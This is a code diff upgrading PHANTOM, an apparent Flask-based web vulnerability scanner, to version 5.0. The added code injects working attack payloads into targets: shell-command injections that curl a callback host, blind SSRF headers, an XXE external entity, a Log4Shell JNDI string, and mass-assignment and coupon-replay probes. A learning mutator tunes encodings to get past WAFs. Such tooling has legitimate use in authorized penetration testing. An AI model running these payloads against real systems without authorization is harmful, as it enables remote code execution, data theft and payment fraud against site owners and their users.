@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-PHANTOM v4.0 - ULTIMATE Web Vulnerability Scanner
+PHANTOM v5.0 - ULTIMATE Web Vulnerability Scanner
 Flask Web App | Render.com | All 20+ Modules
 """
-import base64,hashlib,hmac,json,math,os,re,socket,ssl,threading,time,uuid,warnings
+import base64,hashlib,hmac,json,math,os,random,re,socket,ssl,threading,time,uuid,warnings
 from collections import deque
 from concurrent.futures import ThreadPoolExecutor,as_completed
 from datetime import datetime
@@ -20,9 +20,21 @@ try:    import dns.resolver,dns.query,dns.zone; DNS_OK=True
 except: DNS_OK=False
 try:    import whois as wh; WHOIS_OK=True
 except: WHOIS_OK=False
+try:    from playwright.sync_api import sync_playwright; PW_OK=True
+except: PW_OK=False
 
-PORT=int(os.environ.get("PORT",5000)); THREADS=15; TIMEOUT=8
-DEPTH=3; MAXURLS=150; DELAY=0.08; VER="4.0"
+PORT=int(os.environ.get("PORT",5000))
+THREADS=int(os.environ.get("PHANTOM_THREADS",24)); TIMEOUT=int(os.environ.get("PHANTOM_TIMEOUT",7))
+DEPTH=int(os.environ.get("PHANTOM_DEPTH",3)); MAXURLS=150
+DELAY=float(os.environ.get("PHANTOM_DELAY",0.0)); VER="5.0"
+FAST=os.environ.get("PHANTOM_FAST","1")!="0"          # speed-first mode (default on)
+SCAN_BUDGET=int(os.environ.get("PHANTOM_BUDGET","300"))# hard time budget (seconds)
+MAX_PARAM=6 if FAST else 12                            # params tested per URL
+MAX_VULN_URLS=40 if FAST else 90                       # representative URLs after dedup
+# Out-of-Band collector base = the scanner's OWN public URL (no external API needed).
+# On Render, RENDER_EXTERNAL_URL is provided automatically.
+OOB_BASE=(os.environ.get("OOB_URL") or os.environ.get("RENDER_EXTERNAL_URL") or "").rstrip("/")
+OOB_HITS={}; OOB_LOCK=threading.Lock()
 app=Flask(__name__); scans={}
 UAS=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
@@ -112,6 +124,14 @@ class CVSSv31:
         "Hidden Parameter":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="N",a="N"),
         "Forced Browsing":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="H",a="N"),
         "Verbose Error Disclosure":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="N",a="N"),
+        "Blind SSRF (OOB)":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="L",a="N"),
+        "Out-of-Band RCE":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="H"),
+        "Blind XXE (OOB)":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="L",a="N"),
+        "Stateful Logic Flaw":dict(av="N",ac="L",pr="L",ui="N",s="U",c="H",i="H",a="N"),
+        "API Misconfiguration":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="N",a="N"),
+        "Mass Assignment":dict(av="N",ac="L",pr="L",ui="N",s="U",c="H",i="H",a="N"),
+        "Excessive Data Exposure":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="N",a="N"),
+        "HTTP Method Override":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="H",a="N"),
     }
     def score(self,vtype):
         vec=self.VV.get(vtype,dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="L",a="N"))
@@ -252,6 +272,76 @@ class SmartFuzzer:
         return [v+"'",v+'"',v+" OR 1=1",v+"<script>alert(1)</script>",v+"/../../../etc/passwd"]
 
 FUZZER=SmartFuzzer()
+
+# ══ ADAPTIVE PAYLOAD MUTATION (Reinforcement Learning — epsilon-greedy bandit)═
+# A real, dependency-free RL agent: each mutation *strategy* is an arm of a
+# multi-armed bandit. The agent observes the server's reaction (WAF block vs
+# reflection vs error) as a reward, updates each strategy's value estimate with
+# an incremental average, and biases future payloads toward strategies that are
+# actually getting through. No API, no model file — pure online learning.
+class AdaptiveMutator:
+    def __init__(self, epsilon=0.2):
+        self.eps = epsilon
+        self.Q   = {}   # strategy -> estimated value
+        self.N   = {}   # strategy -> times tried
+        for s in ("identity","case_swap","url_encode","double_url","comment_break",
+                  "null_byte","unicode_esc","ws_alt","mixed_keyword"):
+            self.Q[s] = 0.0; self.N[s] = 0
+        self._lock = threading.Lock()
+
+    def _apply(self, payload, strat):
+        try:
+            if strat == "identity":     return payload
+            if strat == "case_swap":    return "".join(c.upper() if i%2 else c.lower()
+                                                        for i,c in enumerate(payload))
+            if strat == "url_encode":   return quote(payload, safe="")
+            if strat == "double_url":   return quote(quote(payload, safe=""), safe="")
+            if strat == "comment_break":return payload.replace(" ", "/**/").replace("script","scr/**/ipt")
+            if strat == "null_byte":    return payload + "%00"
+            if strat == "unicode_esc":  return payload.replace("<","%u003c").replace(">","%u003e")
+            if strat == "ws_alt":       return payload.replace(" ", "\t").replace("=", "%09=%09")
+            if strat == "mixed_keyword":return (payload.replace("OR","oR").replace("UNION","UnIoN")
+                                                       .replace("SELECT","SeLeCt").replace("alert","aLeRt"))
+        except Exception:
+            return payload
+        return payload
+
+    def select(self):
+        import random
+        with self._lock:
+            if random.random() < self.eps:
+                return random.choice(list(self.Q))
+            return max(self.Q, key=self.Q.get)
+
+    def reward(self, strat, r):
+        with self._lock:
+            self.N[strat] += 1
+            self.Q[strat] += (r - self.Q[strat]) / self.N[strat]   # incremental mean
+
+    def mutate(self, payload, strat=None):
+        strat = strat or self.select()
+        return strat, self._apply(payload, strat)
+
+    def ranking(self):
+        with self._lock:
+            return sorted(((s, round(self.Q[s],3), self.N[s]) for s in self.Q),
+                          key=lambda x: -x[1])
+
+
+# ══ OUT-OF-BAND (OOB) HELPERS ════════════════════════════════════════════════
+# The scanner's own public URL acts as the interaction listener. Any blind SSRF/
+# RCE/XXE that makes the target call our /oob/<token> endpoint is captured here.
+def oob_url(token, ctx):
+    base = OOB_BASE or f"http://127.0.0.1:{PORT}"
+    return f"{base}/oob/{token}/{ctx}"
+
+def oob_host(token, ctx):
+    base = OOB_BASE.split("://")[-1] if OOB_BASE else f"127.0.0.1:{PORT}"
+    return f"{base}/oob/{token}/{ctx}"
+
+def oob_hits(token):
+    with OOB_LOCK:
+        return list(OOB_HITS.get(token, []))
 
 # ══ JS SECRET PATTERNS (45+) ═════════════════════════════════════════════════
 JS_SECRETS={
@@ -567,6 +657,14 @@ VULN_IMPACT={
     "Hidden Parameter":"Undocumented parameter alters behaviour — debug/admin features reachable",
     "Forced Browsing":"Protected page reachable without authentication — access-control bypass",
     "Verbose Error Disclosure":"Stack trace leaks framework, paths and queries — aids exploitation",
+    "Blind SSRF (OOB)":"Server fetched an attacker URL out-of-band — internal pivot, metadata theft",
+    "Out-of-Band RCE":"Injected command executed and called back — confirmed remote code execution",
+    "Blind XXE (OOB)":"XML parser resolved an external entity out-of-band — file read / SSRF",
+    "Stateful Logic Flaw":"Multi-step flow bypassed — skip payment/verification, replay, sequence abuse",
+    "API Misconfiguration":"API exposes data or debug without auth — broken object/function-level access",
+    "Mass Assignment":"Client can set protected fields (role/is_admin) — privilege escalation",
+    "Excessive Data Exposure":"API returns sensitive fields (password/token) the client shouldn't see",
+    "HTTP Method Override":"Method-override header lets attacker reach DELETE/PUT via POST",
 }
 VULN_FIX={
     "SQL Injection":["Use parameterized queries: cursor.execute('SELECT * FROM t WHERE id=%s',(id,))","Apply strict input whitelist","Enforce least-privilege DB user"],
@@ -626,6 +724,14 @@ VULN_FIX={
     "Hidden Parameter":["Remove debug/admin parameters from production","Enforce server-side authorization on every feature","Audit parameter handling"],
     "Forced Browsing":["Enforce authentication and authorization server-side","Never rely on hidden URLs for protection","Default-deny on protected routes"],
     "Verbose Error Disclosure":["Disable debug mode in production","Return generic error pages","Log details server-side only"],
+    "Blind SSRF (OOB)":["Allow-list outbound destinations","Block link-local/RFC-1918 ranges","Use IMDSv2 and disable unused URL fetchers"],
+    "Out-of-Band RCE":["Never pass input to a shell","Use parameterized subprocess calls (shell=False)","Patch the vulnerable component immediately"],
+    "Blind XXE (OOB)":["Disable external entity & DTD processing","Use a hardened XML parser","Validate/normalise XML before parsing"],
+    "Stateful Logic Flaw":["Enforce server-side state machines for each flow","Verify every prior step before the next","Make critical actions idempotent and re-validated"],
+    "API Misconfiguration":["Require auth on every API route","Implement object & function-level authorization","Disable debug/introspection in production"],
+    "Mass Assignment":["Bind only an explicit allow-list of fields","Reject unknown/protected keys","Separate read and write DTOs"],
+    "Excessive Data Exposure":["Return only fields the client needs","Filter sensitive attributes server-side","Use response schemas / serializers"],
+    "HTTP Method Override":["Disable X-HTTP-Method-Override / _method handling","Enforce real-method authorization checks"],
 }
 
 
@@ -660,6 +766,14 @@ class ScanJob:
         self._ua         = 0
         self._delay      = DELAY
         self._lat        = []
+        self.deadline    = self.start + SCAN_BUDGET
+        self.mutator     = AdaptiveMutator()
+        self.oob_token   = self.id + uuid.uuid4().hex[:8]
+        self.oob_events  = []
+        self.api_info    = {}
+
+    def over_budget(self):
+        return time.time() > self.deadline
 
     def log(self, msg, level="INFO"):
         ts = datetime.now().strftime("%H:%M:%S")
@@ -2920,15 +3034,314 @@ def mod_verbose_errors(job, url):
                 return
 
 
+# ══ ROUND-3 ADVANCED ENGINES ═════════════════════════════════════════════════
+
+def _dedup_urls(urls):
+    """Collapse URLs that share the same path + parameter *shape* so we don't
+    re-test 100 identical templates. This is the single biggest speed win."""
+    seen = set(); out = []
+    for u in urls:
+        p = urlparse(u)
+        sig = (p.path, tuple(sorted(dict(parse_qsl(p.query)).keys())))
+        if sig in seen:
+            continue
+        seen.add(sig); out.append(u)
+    return out
+
+
+# ── Engine 1: Out-of-Band injection (self-hosted collector) ───────────────────
+def mod_oob_inject(job):
+    """Plant blind SSRF/RCE/XXE payloads that call back to our own /oob endpoint."""
+    if not OOB_BASE:
+        job.log("OOB engine: set OOB_URL or deploy on Render (RENDER_EXTERNAL_URL) to capture call-backs", "WARN")
+        return
+    tok = job.oob_token
+    job.log(f"OOB engine: planting payloads -> {OOB_BASE}/oob/{tok[:10]}...", "INFO")
+    targets = _dedup_urls(list(job.urls) or [job.url])[:12]
+    for url in targets:
+        if job.over_budget():
+            break
+        params = dict(parse_qsl(urlparse(url).query))
+        for p in list(params)[:MAX_PARAM]:
+            tp = params.copy(); tp[p] = oob_url(tok, f"ssrf-{p}")
+            job.req(url, params=tp)
+            host = oob_host(tok, f"rce-{p}")
+            for sep in (";", "|", "&&", "$("):
+                rce = params.copy(); rce[p] = f"{params[p]}{sep}curl http://{host}"
+                job.req(url, params=rce)
+    # blind SSRF via trusted headers
+    for h in ("Referer", "X-Forwarded-For", "X-Api-Url", "True-Client-IP",
+              "X-Forwarded-Host", "X-Original-URL", "CF-Connecting-IP"):
+        job.req(job.url, headers={h: oob_url(tok, f"hdr-{h}")})
+    # blind XXE
+    xxe = f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "{oob_url(tok,"xxe")}">]><r>&x;</r>'
+    for ct in ("application/xml", "text/xml"):
+        job.req(job.url, method="POST", data=xxe, headers={"Content-Type": ct})
+    # Log4Shell JNDI (best-effort — caught if the resolver fetches over HTTP)
+    job.req(job.url, headers={"User-Agent": "${jndi:ldap://" + oob_host(tok, "jndi") + "}"})
+
+
+def oob_collect(job):
+    """Inspect captured call-backs and raise confirmed blind findings."""
+    hits = oob_hits(job.oob_token)
+    job.oob_events = hits
+    if not hits:
+        if OOB_BASE:
+            job.log("OOB engine: no out-of-band interactions observed (target likely egress-filtered)", "OK")
+        return
+    job.log(f"OOB engine: {len(hits)} call-back(s) received — confirming blind vulns", "VULN")
+    seen = set()
+    for h in hits:
+        ctx = h.get("ctx", "")
+        key = ctx.split("-")[0]
+        if key in seen:
+            continue
+        seen.add(key)
+        ip = h.get("ip", "?")
+        if key == "rce":
+            job.add_vuln("Out-of-Band RCE", job.url, payload=ctx,
+                         evidence=f"Injected command produced a call-back from {ip} — confirmed blind RCE")
+            job.chain("OOB RCE confirmed -> attacker-controlled command ran on the server -> full compromise")
+        elif key == "xxe":
+            job.add_vuln("Blind XXE (OOB)", job.url, payload=ctx,
+                         evidence=f"XML parser resolved our external entity (call-back from {ip}) — blind XXE")
+        elif key == "jndi":
+            job.add_vuln("Out-of-Band RCE", job.url, payload="log4shell",
+                         evidence=f"JNDI lookup call-back from {ip} — Log4Shell-class RCE confirmed")
+        else:
+            job.add_vuln("Blind SSRF (OOB)", job.url, payload=ctx,
+                         evidence=f"Server fetched our OOB URL (call-back from {ip}, ctx={ctx}) — blind SSRF confirmed")
+
+
+# ── Engine 2: RL adaptive payload mutation ────────────────────────────────────
+def mod_adaptive_fuzz(job, url):
+    """Reinforcement-learning fuzzing: the bandit learns which mutation slips
+    past filters/WAF on THIS target, then exploits it."""
+    params = dict(parse_qsl(urlparse(url).query))
+    if not params:
+        return
+    base = job.req(url)
+    if not base:
+        return
+    bases = {"xss": "<script>alert(1)</script>", "sqli": "' OR 1=1-- -"}
+    rounds = 6 if FAST else 14
+    for p in list(params)[:MAX_PARAM]:
+        for _ in range(rounds):
+            if job.over_budget():
+                return
+            cls = random.choice(["xss", "sqli"])
+            strat, mutated = job.mutator.mutate(bases[cls])
+            tp = params.copy(); tp[p] = mutated
+            r = job.req(url, params=tp)
+            if not r:
+                job.mutator.reward(strat, -0.5); continue
+            if r.status_code in (403, 406, 429, 503):
+                job.mutator.reward(strat, -1.0)              # WAF blocked it
+                continue
+            reward = 0.3                                     # got through the filter
+            low = r.text.lower()
+            if cls == "xss" and ("alert(1)" in r.text or "<script>alert" in low):
+                job.add_vuln("Reflected XSS", url, param=p, payload=mutated,
+                             evidence=f"Adaptive RL mutation '{strat}' reflected unsanitised — XSS bypass")
+                job.mutator.reward(strat, 1.0); return
+            if cls == "sqli" and any(re.search(e, low) for e in SQL_ERRORS):
+                job.add_vuln("SQL Injection", url, param=p, payload=mutated,
+                             evidence=f"Adaptive RL mutation '{strat}' triggered a SQL error — injection")
+                job.mutator.reward(strat, 1.0); return
+            job.mutator.reward(strat, reward)
+
+
+# ── Engine 3: Stateful business-logic sequences ───────────────────────────────
+def mod_stateful_logic(job):
+    """Drives multi-step flows with a persistent session to find sequence abuse."""
+    s = requests.Session(); s.verify = False
+    s.headers.update({"User-Agent": UAS[0]})
+    base = job.url.rstrip("/")
+
+    def sget(u, **kw):
+        try: return s.get(u, timeout=TIMEOUT, **kw)
+        except Exception: return None
+    def spost(u, data):
+        try: return s.post(u, data=data, timeout=TIMEOUT)
+        except Exception: return None
+
+    # 1) Sequence/step bypass — jump straight to a 'final step' page
+    later_steps = ["/checkout/success", "/order/confirm", "/payment/success", "/cart/checkout",
+                   "/order/complete", "/thank-you", "/account/verified", "/confirm",
+                   "/download/success", "/api/order/confirm", "/success"]
+    OK = ["success", "confirmed", "thank you", "order #", "complete", "paid", "verified", "congratulations"]
+    for p in later_steps:
+        if job.over_budget(): break
+        r = sget(base + p, allow_redirects=False)
+        if r and r.status_code == 200 and any(k in r.text.lower() for k in OK):
+            job.add_vuln("Stateful Logic Flaw", base + p,
+                         evidence="Final-step page reachable directly without completing the prior steps — sequence bypass")
+            job.chain("Stateful bypass -> skip payment/verification step -> obtain goods/access for free")
+            break
+
+    # 2) Coupon / discount replay (idempotency abuse)
+    for form in job.forms:
+        names = " ".join(form["inputs"]).lower()
+        if any(k in names for k in ("coupon", "promo", "discount", "voucher", "gift", "redeem")):
+            data = {n: "TEST10" for n in form["inputs"]}
+            r1 = spost(form["action"], data); r2 = spost(form["action"], data)
+            if r1 and r2 and r1.status_code == 200 == r2.status_code and "invalid" not in r2.text.lower():
+                job.add_vuln("Stateful Logic Flaw", form["action"],
+                             evidence="Coupon/discount still accepted on repeat submission — replay / stacking")
+            break
+
+    # 3) Negative / overflow quantity in cart-style forms
+    for form in job.forms:
+        names = [n.lower() for n in form["inputs"]]
+        if any(k in n for n in names for k in ("qty", "quantity", "amount", "count")):
+            for bad in ("-1", "0", "999999999"):
+                data = {}
+                for n in form["inputs"]:
+                    data[n] = bad if any(k in n.lower() for k in ("qty","quantity","amount","count")) else "1"
+                r = spost(form["action"], data)
+                if r and r.status_code == 200 and "invalid" not in r.text.lower() and "error" not in r.text.lower():
+                    job.add_vuln("Stateful Logic Flaw", form["action"], payload=f"qty={bad}",
+                                 evidence=f"Cart accepted quantity={bad} without validation — price/stock manipulation")
+                    return
+            break
+
+
+# ── Engine 4: API & mobile-backend fuzzing ────────────────────────────────────
+def mod_api_fuzz(job):
+    bases  = ["/api", "/api/v1", "/api/v2", "/rest", "/v1", "/v2",
+              "/mobile/api", "/app/api", "/api/mobile", "/graphql"]
+    common = ["/users", "/user", "/me", "/account", "/orders", "/products",
+              "/admin", "/config", "/profile", "/login", "/customers"]
+    found = []
+    for b in bases:
+        if job.over_budget(): break
+        r = job.req(job.url.rstrip("/") + b)
+        if r and ("json" in r.headers.get("Content-Type", "").lower()
+                  or (r.text[:1] in "[{" and r.status_code < 500)):
+            found.append(b)
+    job.api_info = {"bases": found}
+    if found:
+        job.log(f"API surface detected: {found}", "OK")
+
+    test_eps = []
+    for b in (found or ["/api", "/api/v1"]):
+        for e in common:
+            test_eps.append(job.url.rstrip("/") + b + e)
+
+    seen = 0
+    SENS = ['"password"', '"passwd"', '"token"', '"secret"', '"ssn"', '"credit',
+            '"apikey"', '"api_key"', '"private_key"', '"cvv"']
+    for ep in test_eps[:24]:
+        if job.over_budget(): break
+        r = job.req(ep)
+        if not r:
+            continue
+        ct = r.headers.get("Content-Type", "").lower()
+        if "json" not in ct and r.text[:1] not in "[{":
+            continue
+        low = r.text.lower()
+        if any(k in low for k in SENS):
+            job.add_vuln("Excessive Data Exposure", ep,
+                         evidence="API JSON response leaks sensitive fields (password/token/secret/cvv)")
+            seen += 1
+        elif r.status_code == 200 and len(r.text) > 40 and any(k in ep for k in ("user", "order", "account", "admin", "me", "customer")):
+            job.add_vuln("API Misconfiguration", ep,
+                         evidence=f"API returns data without authentication (HTTP 200, {len(r.text)}B) — broken access control")
+            seen += 1
+        if seen >= 4:
+            break
+
+    # HTTP method override smuggling
+    r = job.req(job.url, method="POST", headers={"X-HTTP-Method-Override": "DELETE"})
+    if r and r.status_code in (200, 202, 204):
+        job.add_vuln("HTTP Method Override", job.url,
+                     evidence="X-HTTP-Method-Override: DELETE accepted on a POST — verb smuggling")
+
+    # Mass assignment (inject protected fields in JSON body)
+    for ep in test_eps[:6]:
+        if job.over_budget(): break
+        try:
+            r = job.req(ep, method="POST",
+                        json={"role": "admin", "is_admin": True, "phantom_probe": "1"},
+                        headers={"Content-Type": "application/json"})
+        except Exception:
+            r = None
+        if r and r.status_code in (200, 201) and ("\"admin\"" in r.text.lower() or "is_admin" in r.text.lower()):
+            job.add_vuln("Mass Assignment", ep,
+                         evidence="API echoed back attacker-supplied role/is_admin — mass assignment / privilege escalation")
+            break
+
+
+# ── Engine 5: Headless browser dynamic DOM analysis ───────────────────────────
+def mod_headless_dom(job):
+    """Render the page in real Chromium to catch client-side-only routes, SPA
+    links and DOM XSS that static analysis misses. Degrades gracefully."""
+    if not PW_OK:
+        job.log("Headless DOM: Playwright unavailable — relying on static DOM analysis", "INFO")
+        return
+    fired = {"xss": False}
+    api_urls = set(); new_links = set()
+    try:
+        with sync_playwright() as pw:
+            browser = pw.chromium.launch(headless=True,
+                                         args=["--no-sandbox", "--disable-dev-shm-usage"])
+            page = browser.new_page(ignore_https_errors=True)
+            page.on("dialog", lambda d: (fired.__setitem__("xss", True), d.dismiss()))
+            page.on("request", lambda req: api_urls.add(req.url)
+                    if any(k in req.url for k in ("/api", "/graphql", ".json")) else None)
+            try:
+                page.goto(job.url, timeout=15000, wait_until="networkidle")
+            except Exception:
+                page.goto(job.url, timeout=15000)
+            # harvest client-side rendered links (SPA)
+            for href in page.eval_on_selector_all("a[href]",
+                    "els => els.map(e => e.href)") or []:
+                if job.host in href:
+                    new_links.add(href.split("#")[0])
+            # active DOM-XSS probe via hash sink
+            try:
+                page.goto(job.url + '#"><img src=x onerror=alert(1)>', timeout=8000)
+                page.wait_for_timeout(800)
+            except Exception:
+                pass
+            browser.close()
+    except Exception as e:
+        job.log(f"Headless DOM: browser unavailable ({str(e)[:40]}) — skipped", "INFO")
+        return
+
+    added = 0
+    for l in new_links:
+        if l not in job.urls and added < 30:
+            job.urls.add(l); added += 1
+    if added:
+        job.log(f"Headless DOM: discovered {added} client-side rendered route(s)", "OK")
+    if api_urls:
+        job.api_info.setdefault("xhr_endpoints", list(api_urls)[:15])
+    if fired["xss"]:
+        job.add_vuln("DOM XSS", job.url, payload='#"><img src=x onerror=alert(1)>',
+                     evidence="Headless Chromium executed an injected DOM payload (alert fired) — confirmed DOM XSS")
+        job.chain("Confirmed DOM XSS in real browser -> session/credential theft for every visitor")
+
+
 # ══ PHASE 3 ORCHESTRATOR ═════════════════════════════════════════════════════
 def phase_vulns(job):
-    all_urls = list(job.urls) or [job.url]
-    total    = len(all_urls) * 10 + 12 + 14 + 7
+    # Speed: collapse identical URL templates so we don't re-test the same shape
+    all_urls = _dedup_urls(list(job.urls) or [job.url])[:MAX_VULN_URLS]
+    total    = len(all_urls) * 10 + 12 + 14 + 7 + 4
     job.set_phase("Phase 3: Vulns & Exploits", total)
-    job.log(f"Testing {len(all_urls)} URLs with all {48} security modules...", "INFO")
+    job.log(f"Testing {len(all_urls)} unique URL shapes with 54 modules (FAST={FAST})...", "INFO")
+
+    # Out-of-band payloads planted first so call-backs have the whole scan to arrive
+    try:
+        mod_oob_inject(job)
+    except Exception as e:
+        job.log(f"mod_oob_inject error: {str(e)[:60]}", "WARN")
+    job.advance("Phase 3: Vulns & Exploits", 4)
 
     # Per-URL tests (parallelized)
     def scan_url(url):
+        if job.over_budget():
+            return
         mod_sqli(job, url)
         mod_xss(job, url)
         mod_lfi(job, url)
@@ -2947,6 +3360,7 @@ def phase_vulns(job):
         mod_xpath_ldap(job, url)
         mod_param_mining(job, url)
         mod_verbose_errors(job, url)
+        mod_adaptive_fuzz(job, url)
         job.advance("Phase 3: Vulns & Exploits", 10)
 
     with ThreadPoolExecutor(max_workers=THREADS) as ex:
@@ -2996,7 +3410,12 @@ def phase_vulns(job):
               mod_websocket, mod_well_known,
               # round-2 site-wide
               mod_stored_xss, mod_user_enum, mod_file_upload, mod_backup_files,
-              mod_web_cache_deception, mod_jwt_attacks, mod_forced_browse):
+              mod_web_cache_deception, mod_jwt_attacks, mod_forced_browse,
+              # round-3 advanced engines
+              mod_stateful_logic, mod_api_fuzz):
+        if job.over_budget():
+            job.log("Time budget reached — wrapping up remaining site-wide modules", "WARN")
+            break
         try:
             m(job)
         except Exception as e:
@@ -3210,10 +3629,26 @@ def run_scan(job):
         phase_osint(job)
         phase_ports(job)
         phase_spider(job)
+        try:
+            mod_headless_dom(job)          # dynamic DOM / SPA enrichment (best-effort)
+        except Exception as e:
+            job.log(f"headless dom error: {str(e)[:50]}", "WARN")
         phase_hypothesis(job)
         phase_vulns(job)
         verify_findings(job)
         analyze_attack_chains(job)
+        # OOB settle window — give planted call-backs a moment to land
+        if OOB_BASE and not oob_hits(job.oob_token):
+            for _ in range(6):
+                if oob_hits(job.oob_token):
+                    break
+                time.sleep(1)
+        oob_collect(job)
+        # Surface what the RL mutator learned about this target
+        top = job.mutator.ranking()[:3]
+        if any(n for _, _, n in top):
+            job.log("RL mutator top strategies: " +
+                    ", ".join(f"{s}(Q={q})" for s, q, n in top if n), "OK")
     except Exception as e:
         job.log(f"Scanner error: {e}", "WARN")
     finally:
@@ -3227,7 +3662,7 @@ HOME_HTML = """<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>PHANTOM v4.0 — Ultimate Web Scanner</title>
+<title>PHANTOM v5.0 — Ultimate Web Scanner</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 :root{--bg:#080c10;--bg2:#0d1117;--bg3:#161b22;--bd:#21262d;
@@ -3346,7 +3781,7 @@ input[type=text]:focus{border-color:var(--cy)}
 ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
 ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝</pre>
   <div class="hdr-txt">
-    <h1>PHANTOM<span class="bdg br">v4.0</span><span class="bdg bc">CVSS v3.1</span><span class="bdg bm">WAF+15 WAFs</span><span class="bdg bg">SMART FUZZER</span><span class="bdg byr">48 MODULES</span></h1>
+    <h1>PHANTOM<span class="bdg br">v5.0</span><span class="bdg bc">CVSS v3.1</span><span class="bdg bm">OOB ENGINE</span><span class="bdg bg">RL MUTATOR</span><span class="bdg byr">54 MODULES</span></h1>
     <p>Persistent Heuristic Attack &amp; Network Threat Observation Machine — Ultimate Edition</p>
     <p style="color:#f8514970;font-size:.65rem;margin-top:1px">⚠ For authorized penetration testing only — IT Act 2000, Section 66</p>
   </div>
@@ -3356,12 +3791,12 @@ input[type=text]:focus{border-color:var(--cy)}
 <div id="fa">
   <div class="card">
     <h2>⚡ Launch Ultimate Security Scan</h2>
-    <p>PHANTOM v4.0 runs 4 autonomous phases: OSINT + Subdomain Enum → Async Port Scan → Deep Spider + JS Secret Extraction → 48 Vulnerability Modules with Chain Engine. CVSS v3.1 auto-scoring on every finding.</p>
+    <p>PHANTOM v5.0 runs autonomous phases: OSINT + Subdomain Enum → Async Port Scan → Deep Spider + Headless DOM → 54 Modules incl. Out-of-Band engine, RL adaptive mutation, stateful business-logic & API fuzzing, with CVSS v3.1 scoring and an attack-chain engine.</p>
     <div style="margin-bottom:10px">
       <label>Target URL</label>
       <input type="text" id="iu" value="http://testphp.vulnweb.com/" placeholder="https://your-authorized-target.com">
     </div>
-    <button type="button" class="btn" id="sb" onclick="go()">⚡ LAUNCH PHANTOM v4.0</button>
+    <button type="button" class="btn" id="sb" onclick="go()">⚡ LAUNCH PHANTOM v5.0</button>
     <div id="err-box" style="display:none;margin-top:10px;background:#f8514918;border:1px solid #f8514960;
       border-radius:8px;padding:10px 14px;color:#f85149;font-size:.8rem;font-family:monospace"></div>
     <div class="qt" style="margin-top:10px">
@@ -3438,7 +3873,7 @@ const PH=['Phase 0: OSINT & Recon','Phase 1: Port Scan','Phase 2: Spider & JS','
 function su(u){document.getElementById('iu').value=u;return false}
 function showErr(msg){
   const b=document.getElementById('sb');
-  b.disabled=false;b.textContent='⚡ LAUNCH PHANTOM v4.0';
+  b.disabled=false;b.textContent='⚡ LAUNCH PHANTOM v5.0';
   document.getElementById('fa').style.display='block';
   document.getElementById('pa').style.display='none';
   const eb=document.getElementById('err-box');
@@ -3636,12 +4071,31 @@ def status(sid):
         "urls_count":   len(job.urls),
         "ports_count":  len(job.ports),
         "forms_count":  len(job.forms),
+        "oob_events":   job.oob_events,
+        "api_info":     job.api_info,
+        "rl_strategies":job.mutator.ranking(),
     })
+
+@app.route("/oob/<token>", defaults={"rest": ""})
+@app.route("/oob/<token>/<path:rest>")
+def oob_collect_endpoint(token, rest):
+    """Out-of-band interaction listener — the heart of the OOB engine. Any blind
+    SSRF/RCE/XXE that makes a target fetch this URL is recorded here."""
+    with OOB_LOCK:
+        OOB_HITS.setdefault(token, []).append({
+            "ts":   datetime.now().strftime("%H:%M:%S"),
+            "ip":   request.headers.get("X-Forwarded-For", request.remote_addr),
+            "ua":   request.headers.get("User-Agent", "")[:120],
+            "ctx":  rest,
+            "path": request.full_path[:200],
+        })
+    return ("", 204)
 
 @app.route("/health")
 def health():
     active = sum(1 for s in scans.values() if s.status=="running")
-    return jsonify({"status":"ok","version":VER,"active_scans":active})
+    return jsonify({"status":"ok","version":VER,"active_scans":active,
+                    "oob_ready":bool(OOB_BASE),"headless":PW_OK,"fast":FAST})
 
 if __name__ == "__main__":
     print(f"[*] PHANTOM v{VER} starting on port {PORT}")
